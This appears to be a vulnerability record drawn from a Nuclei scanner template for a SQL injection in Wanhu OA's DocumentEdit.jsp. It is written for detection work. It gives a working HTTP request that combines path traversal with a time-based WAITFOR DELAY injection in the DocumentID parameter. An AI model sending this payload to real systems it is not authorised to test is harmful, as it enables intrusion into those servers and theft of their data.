# Vulnerability: WanhuOA DocumentEdit.jsp - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`wanhu-documentedit-sqli.yaml`)

## Description
The Wanhu OA DocumentEdit.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 15s
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:7'-- HTTP/1.1
Host: {{Hostname}}
```

